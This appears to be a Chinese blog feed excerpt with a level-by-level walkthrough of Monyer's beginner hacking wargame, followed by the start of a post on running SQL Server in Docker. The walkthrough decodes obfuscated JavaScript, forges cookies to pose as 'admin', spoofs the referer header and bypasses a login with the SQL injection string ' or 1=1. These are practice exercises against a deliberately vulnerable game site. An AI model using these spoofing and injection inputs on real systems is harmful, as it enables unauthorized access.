<h1 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h1><p><a href="http://monyer.com/game/game1/first.php" target="_blank" rel="external">http://monyer.com/game/game1/first.php</a></p>
<p>打开页面依然是什么都没有，这很正常。审查工具看代码。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/rocketscript"</span> <span class="attr">data-rocketoptimized</span>=<span class="string">"true"</span>&gt;</span><span class="javascript"></span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.getElementById(<span class="string">'txt'</span>).value==<span class="string">"  "</span>)&#123;</div><div class="line">            <span class="built_in">window</span>.location.href=<span class="string">"hello.php"</span>;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            alert(<span class="string">"密码错误"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>好了 我们知道密码了，并且知道下一关的文件是hello.php</p>
<h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><p><a href="http://monyer.com/game/game1/hello.php" target="_blank" rel="external">http://monyer.com/game/game1/hello.php</a></p>
<p>审查工具看源代码，head中</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/rocketscript"</span> <span class="attr">data-rocketoptimized</span>=<span class="string">"true"</span>&gt;</span><span class="javascript"></span></div><div class="line">    <span class="built_in">document</span>.oncontextmenu=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="literal">false</span>&#125;;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> a,b,c,d,e,f,g;</div><div class="line">    a = <span class="number">3.14</span>;</div><div class="line">    b = a * <span class="number">2</span>;</div><div class="line">    c = a + b;</div><div class="line">    d = c / b + a;</div><div class="line">    e = c - d * b + a;</div><div class="line">    f = e + d /c -b * a;</div><div class="line">    g = f * e - d + c * b + a;</div><div class="line">    a = g * g;</div><div class="line">    a = <span class="built_in">Math</span>.floor(a);</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.getElementById(<span class="string">"txt"</span>).value==a)&#123;</div><div class="line">            <span class="built_in">window</span>.location.href=a + <span class="string">".php"</span>;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            alert(<span class="string">"密码错误"</span>);</div><div class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>现在是2016年了，我们不需要手算和计算器了。直接在chrome的console里输入<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a,b,c,d,e,f,g;</div><div class="line">    a = <span class="number">3.14</span>;</div><div class="line">    b = a * <span class="number">2</span>;</div><div class="line">    c = a + b;</div><div class="line">    d = c / b + a;</div><div class="line">    e = c - d * b + a;</div><div class="line">    f = e + d /c -b * a;</div><div class="line">    g = f * e - d + c * b + a;</div><div class="line">    a = g * g;</div><div class="line">    a = <span class="built_in">Math</span>.floor(a);</div><div class="line">    </div><div class="line"><span class="number">424178</span></div></pre></td></tr></table></figure></p>
<p>好的我们知道a的值是424178，输入，进入下一关</p>
<h1 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h1><p><a href="http://monyer.com/game/game1/424178.php" target="_blank" rel="external">http://monyer.com/game/game1/424178.php</a></p>
<p>head中存在js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script type=<span class="string">"text/rocketscript"</span> data-rocketoptimized=<span class="string">"true"</span>&gt;</div><div class="line">    <span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">104</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">107</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">123</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">97</span>,<span class="number">32</span>,<span class="number">61</span>,<span class="number">32</span>,<span class="number">39</span>,<span class="number">100</span>,<span class="number">52</span>,<span class="number">103</span>,<span class="number">39</span>,<span class="number">59</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">105</span>,<span class="number">102</span>,<span class="number">40</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">117</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">69</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">66</span>,<span class="number">121</span>,<span class="number">73</span>,<span class="number">100</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">116</span>,<span class="number">120</span>,<span class="number">116</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">46</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">117</span>,<span class="number">101</span>,<span class="number">61</span>,<span class="number">61</span>,<span class="number">97</span>,<span class="number">41</span>,<span class="number">123</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">09</span>,<span class="number">119</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">46</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">46</span>,<span class="number">104</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">102</span>,<span class="number">61</span>,<span class="number">97</span>,<span class="number">43</span>,<span class="number">34</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">104</span>,<span class="number">112</span>,<span class="number">34</span>,<span class="number">59</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">125</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">123</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">09</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">34</span>,<span class="number">23494</span>,<span class="number">30721</span>,<span class="number">38169</span>,<span class="number">35823</span>,<span class="number">34</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">125</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">125</span>));</div><div class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div></pre></td></tr></table></figure>
<p>新时代无须解释，直接上chrome consle<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">String</span>.fromCharCode(<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">104</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">107</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">123</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">97</span>,<span class="number">32</span>,<span class="number">61</span>,<span class="number">32</span>,<span class="number">39</span>,<span class="number">100</span>,<span class="number">52</span>,<span class="number">103</span>,<span class="number">39</span>,<span class="number">59</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">105</span>,<span class="number">102</span>,<span class="number">40</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">117</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">69</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">66</span>,<span class="number">121</span>,<span class="number">73</span>,<span class="number">100</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">116</span>,<span class="number">120</span>,<span class="number">116</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">46</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">117</span>,<span class="number">101</span>,<span class="number">61</span>,<span class="number">61</span>,<span class="number">97</span>,<span class="number">41</span>,<span class="number">123</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">09</span>,<span class="number">119</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">46</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">46</span>,<span class="number">104</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">102</span>,<span class="number">61</span>,<span class="number">97</span>,<span class="number">43</span>,<span class="number">34</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">104</span>,<span class="number">112</span>,<span class="number">34</span>,<span class="number">59</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">125</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">123</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">09</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">34</span>,<span class="number">23494</span>,<span class="number">30721</span>,<span class="number">38169</span>,<span class="number">35823</span>,<span class="number">34</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">125</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">125</span>)</div></pre></td></tr></table></figure></p>
<p>输出为<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</div><div class="line">	<span class="keyword">var</span> a = <span class="string">'d4g'</span>;</div><div class="line">	<span class="keyword">if</span>(<span class="built_in">document</span>.getElementById(<span class="string">'txt'</span>).value==a)&#123;</div><div class="line">		<span class="built_in">window</span>.location.href=a+<span class="string">".php"</span>;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		alert(<span class="string">"密码错误"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>好了我们知道了，密码是d4g，下一关！</p>
<h1 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h1><p><a href="http://monyer.com/game/game1/d4g.php" target="_blank" rel="external">http://monyer.com/game/game1/d4g.php</a></p>
<p>这一关非常猥琐，页面会自动跳转，稍有不注意，就跳走了。<br>打开后立即按esc停止。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script type=<span class="string">"text/rocketscript"</span> data-rocketoptimized=<span class="string">"true"</span>&gt;</div><div class="line">    <span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span>(<span class="params">p,a,c,k,e,d</span>)</span>&#123;e=<span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span> c.toString(<span class="number">36</span>)&#125;;<span class="keyword">if</span>(!<span class="string">''</span>.replace(<span class="regexp">/^/</span>,<span class="built_in">String</span>))&#123;<span class="keyword">while</span>(c--)d[c.toString(a)]=k[c]||c.toString(a);k=[<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> d[e]&#125;];e=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">'\\w+'</span>&#125;;c=<span class="number">1</span>&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'\\b'</span>+e(c)+<span class="string">'\\b'</span>,<span class="string">'g'</span>),k[c]);<span class="keyword">return</span> p&#125;(<span class="string">'a="e";d c()&#123;b(9.8(\'7\').6==a)&#123;5.4.3=a+".2"&#125;1&#123;0("密码错误")&#125;&#125;'</span>,<span class="number">15</span>,<span class="number">15</span>,<span class="string">'alert|else|php|href|location|window|value|txt|getElementById|document||if|check|function|3bhe'</span>.split(<span class="string">'|'</span>),<span class="number">0</span>,&#123;&#125;))</div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure>
<p>显然这是一个加密的js，我们需要解密，上解密工具：</p>
<p><a href="http://tool.lu/js/" target="_blank" rel="external">http://tool.lu/js/</a></p>
<p>解密后：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">a = <span class="string">"3bhe"</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</div><div class="line">	<span class="keyword">if</span> (<span class="built_in">document</span>.getElementById(<span class="string">'txt'</span>).value == a) &#123;</div><div class="line">		<span class="built_in">window</span>.location.href = a + <span class="string">".php"</span></div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		alert(<span class="string">"密码错误"</span>)</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>密码是 3bhe 下一关</p>
<p>诶？怎么不对？仔细检查源代码发现下面还有一行<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">eval</span>(<span class="string">"\141\75\141\56\164\157\125\160\160\145\162\103\141\163\145\50\51\53\61\73"</span>);</div></pre></td></tr></table></figure></p>
<p>解密！<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a = a.toUpperCase() + <span class="number">1</span>;</div></pre></td></tr></table></figure></p>
<p>.toUpperCase()是转换大写，所以密码是 3BHE1 下一关 go</p>
<h1 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h1><p><a href="http://monyer.com/game/game1/3BHE1.php" target="_blank" rel="external">http://monyer.com/game/game1/3BHE1.php</a></p>
<blockquote>
<p>密码在哪儿？额，我藏在页面里了哦！</p>
</blockquote>
<p>这题的难点在于 找到不密码藏在哪里了 搜索了个遍 就是找不到密码 看看http头呢？</p>
<p>找到了，在cookie里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">monyer:the password for the next level is asdf</div></pre></td></tr></table></figure>
<p>下一关！</p>
<h1 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h1><p><a href="http://monyer.com/game/game1/asdf.php" target="_blank" rel="external">http://monyer.com/game/game1/asdf.php</a></p>
<p>是个线索题目</p>
<p>Get the latest fashion, beauty, dating, and health tips. Plus, win freebies, take quizzes, and check your daily horoscope! Girl Games - 9000+ Free Games for Girls …</p>
<p>真蛋疼<br>把这个线索在网上一搜 第一个已经是一个结题方案了，看来monyer的游戏已经成功干过一个网站了。</p>
<p>这个答案是；seventeen</p>
<h1 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h1><p><a href="http://monyer.com/game/game1/seventeen7.php" target="_blank" rel="external">http://monyer.com/game/game1/seventeen7.php</a></p>
<p>社工题</p>
<p>先解密md5吧</p>
<p>5e023995fb3f5e840ee684784f8f0799</p>
<p><a href="http://www.somd5.com/" target="_blank" rel="external">http://www.somd5.com/</a></p>
<p>解密出  eighteen8</p>
<p>下一关</p>
<h1 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h1><p><a href="http://monyer.com/game/game1/eighteen8.php" target="_blank" rel="external">http://monyer.com/game/game1/eighteen8.php</a></p>
<p>直接看到 一个404 不要着急 审查工具</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;p style=&quot;display:none&quot;&gt;</div><div class="line">第8关</div><div class="line">朋友您好，第8关欢迎您！</div><div class="line">我对您的聪明才智感到惊讶！</div><div class="line">相信我，现在世界上85%以上的人都在你之下，</div><div class="line">所以你可以大步向前，义无反顾地进行你的事业了。</div><div class="line">因为只要你肯努力，不畏惧挫折，这个世界上没有难倒你的事。</div><div class="line">那么继续我们的约定，我将告诉你第9关的入口：</div><div class="line">10000以内所有质数和.php</div><div class="line">&lt;/p&gt;</div></pre></td></tr></table></figure>
<p>10000以内所有质数和，so easy！写个javascript 算一下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">var sum = 0;</div><div class="line">for (var i = 2; i &lt; 10000; i++) &#123;</div><div class="line">	var flag = true;</div><div class="line">	for (var j = 2; j &lt;= Math.sqrt(i); j++) &#123;</div><div class="line">		if (i % j == 0) flag = false ;</div><div class="line">	&#125;</div><div class="line">    if(flag) &#123;sum = sum + i;&#125;</div><div class="line">&#125;</div><div class="line">console.log(sum);</div><div class="line"></div><div class="line">5736396</div></pre></td></tr></table></figure>
<p>下一关</p>
<h1 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h1><p><a href="http://monyer.com/game/game1/5736396.php" target="_blank" rel="external">http://monyer.com/game/game1/5736396.php</a></p>
<p>在命令行里输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wget http://monyer.com/game/game1/img/4681851790659554.jpg</div><div class="line">cat 4681851790659554.jpg</div></pre></td></tr></table></figure></p>
<p>密码藏在图片里<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">���^�v��*&#123;I�z��^�iؾSRW�V�6�Z��(����H�����ٹ�����</div><div class="line">�Ǿ���ʽ�ʲô���ţ�</div><div class="line">�ԣ�������������������......��</div><div class="line">��ϲ�㣡</div><div class="line">��ʮ������Ϊ��MonyerLikeYou_the10level</div><div class="line">�����ڿ�ʼ�漰������Ķ�̬���������㶼���԰���ʾ������ɵģ�</div><div class="line">�����Լ���û��ģ�%</div></pre></td></tr></table></figure></p>
<p>MonyerLikeYou_the10level</p>
<h1 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h1><p><a href="http://monyer.com/game/game1/MonyerLikeYou_the10level.php" target="_blank" rel="external">http://monyer.com/game/game1/MonyerLikeYou_the10level.php</a></p>
<blockquote>
<p>当前用户身份为simpleuser 不是admin，无法显示下一关密码</p>
</blockquote>
<p>很显然这是一道session/cookie欺骗题</p>
<p>在console里直接输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">document.cookie=&quot;username=admin&quot;</div></pre></td></tr></table></figure></p>
<p>刷新</p>
<blockquote>
<p>好聪明哦！下一关密码为：doyouknow</p>
</blockquote>
<p>下一关！</p>
<h1 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h1><p><a href="http://monyer.com/game/game1/doyouknow.php?action=show_login_false" target="_blank" rel="external">http://monyer.com/game/game1/doyouknow.php?action=show_login_false</a></p>
<blockquote>
<p>你的session不是passer，不能查看下一关密码</p>
</blockquote>
<p>在console里直接输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">document.cookie=&quot;username=passer&quot;</div></pre></td></tr></table></figure></p>
<p>刷新，好像不对哦，monyer骗我，哼！</p>
<p>再看标题 action=show_login_false </p>
<p><a href="http://monyer.com/game/game1/doyouknow.php?action=show_login_true" target="_blank" rel="external">http://monyer.com/game/game1/doyouknow.php?action=show_login_true</a></p>
<blockquote>
<p>您的session为passer，所以您可以查看下一关密码：smartboy</p>
</blockquote>
<p>下一关！</p>
<h1 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h1><p><a href="http://monyer.com/game/game1/smartboy.php" target="_blank" rel="external">http://monyer.com/game/game1/smartboy.php</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">JTRBJTU0JTYzJTdBJTRBJTU0JTVBJTQ3JTRBJTU0JTU5JTc5JTRBJTU0JTU5JTMxJTRBJTU0JTU5JTc4JTRBJTU0JTYzJTMxJTRBJTU0JTYzJTMwJTRBJTU0JTU5JTM1JTRBJTU0JTU5JTMyJTRBJTU0JTYzJTMxJTRBJTU0JTVBJTQ0JTRBJTU0JTRBJTQ2JTRBJTU0JTYzJTc3JTRBJTU0JTU5JTM0JTRBJTU0JTYzJTc3</div></pre></td></tr></table></figure>
<p>直觉告诉我，这显然是Base64 解密<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%4A%54%63%7A%4A%54%5A%47%4A%54%59%79%4A%54%59%31%4A%54%59%78%4A%54%63%31%4A%54%63%30%4A%54%59%35%4A%54%59%32%4A%54%63%31%4A%54%5A%44%4A%54%4A%46%4A%54%63%77%4A%54%59%34%4A%54%63%77</div></pre></td></tr></table></figure></p>
<p>直觉告诉我，这显然是 UrlEncode 解密</p>
<p>JTczJTZGJTYyJTY1JTYxJTc1JTc0JTY5JTY2JTc1JTZDJTJFJTcwJTY4JTcw</p>
<p>直觉再次告诉我，这显然是 Base64 解密</p>
<p>%73%6F%62%65%61%75%74%69%66%75%6C%2E%70%68%70</p>
<p>直觉再次告诉我，这显然是  UrlEncode 解密</p>
<p>sobeautiful.php</p>
<p>不错 密码就是sobeautiful</p>
<h1 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h1><p><a href="http://monyer.com/game/game1/sobeautiful.php" target="_blank" rel="external">http://monyer.com/game/game1/sobeautiful.php</a></p>
<blockquote>
<p>本页禁止盗链！</p>
</blockquote>
<p>wtf..显然他判断了http来源，需要伪造http referer，那么我们在之前的第十二关的审查代码中加入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>= <span class="string">"http://monyer.com/game/game1/sobeautiful.php"</span>&gt;</span> 简便伪造referer<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
<blockquote>
<p>欢迎您来到第13关</p>
<p>请输入密码进入第14关：</p>
<p>没有输入密码 或 密码错误 或 系统错误！</p>
</blockquote>
<p>看源代码有post提交</p>
<p>这是一道SQL 注入题</p>
<p>试试我大万能密码！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos; or 1=1</div></pre></td></tr></table></figure></p>
<p>万能密码熟记于心</p>
<blockquote>
<p>下一关密码：whatyouneverknow</p>
</blockquote>
<p>下一关！</p>
<h1 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h1><p><a href="http://monyer.com/game/game1/whatyouneverknow.php" target="_blank" rel="external">http://monyer.com/game/game1/whatyouneverknow.php</a></p>
<p>感谢@Echowxsy提供第14关解密过程</p>
<p><img src="/content/images/monyerhack/01.jpg" alt=""></p>
<p><img src="/content/images/monyerhack/02.jpg" alt=""></p>
<p><img src="/content/images/monyerhack/03.jpg" alt=""></p>
<p><img src="/content/images/monyerhack/1.jpg" alt=""></p>
<p><img src="/content/images/monyerhack/2.jpg" alt=""></p>
<p><img src="/content/images/monyerhack/3.jpg" alt=""></p>
<p><img src="/content/images/monyerhack/5.jpg" alt=""></p>
<h1 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h1><p><img src="/content/images/monyerhack/4.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前混百度空间混久了，认识很多大牛，不乏monyer大牛。很早很早以前，他做了一个黑客小游戏，当时还不太会玩，现在突然打开发现，网站竟然还活着，决定重温经典。&lt;/p&gt;
    
    </summary>
    
      <category term="Hack" scheme="http://blog.yfgeek.com/categories/Hack/"/>
    
    
      <category term="Hack" scheme="http://blog.yfgeek.com/tags/Hack/"/>
    
  </entry>
  
  <entry>
    <title>Docker下配置SQL Server for Linux</title>
    <link href="http://blog.yfgeek.com/2016/11/22/docker-SQLServer/"/>
    <id>http://blog.yfgeek.com/2016/11/22/docker-SQLServer/</id>
    <published>2016-11-22T14:44:06.000Z</published>
    <updated>2017-03-08T19:05:11.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>微软已经不再是以前的那个微软了，如果微软SQL Server早开源几年，估计现在数据库方面就没有Oracle什么事情了。</p>
<p>Canonical 技术主管 Dustin Kirkland 表示：「微软和 Canonical 继续在 Windows 世界和 Linux 世界之间建立桥梁。 SQL Server on Ubuntu 便是这种趋势的又一示例。」</p>
<a id="more"></a>
<p><img src="/content/images/sqldocker/micosoft.png" alt=""></p>
<h1 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h1><ul>
<li>Docker版本在 1.8 以上</li>
<li>至少 4GB 硬盘空间</li>
<li>至少 4GB 内存</li>
</ul>
<p><img src="/content/images/sqldocker/0.jpg" alt=""></p>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="拉取docker镜像"><a href="#拉取docker镜像" class="headerlink" title="拉取docker镜像"></a>拉取docker镜像</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker pull microsoft/mssql-server-linux</div></pre></td></tr></table></figure>
<h2 id="运行docker镜像"><a href="#运行docker镜像" class="headerlink" title="运行docker镜像"></a>运行docker镜像</h2><p><code>YourStrong!Passw0rd</code> 为你的密码</p>
<p><code>1433</code> 为对外端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run -e &apos;ACCEPT_EULA=Y&apos; -e &apos;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&apos; -p 1433:1433 -d microsoft/mssql-server-linux</div></pre></td></tr></table></figure></p>
<p>🌰 例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker run -e &apos;ACCEPT_EULA=Y&apos; -e &apos;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&apos; -p 1433:1433 -d microsoft/mssql-server-linux</div></pre></td></tr></table></figure></p>
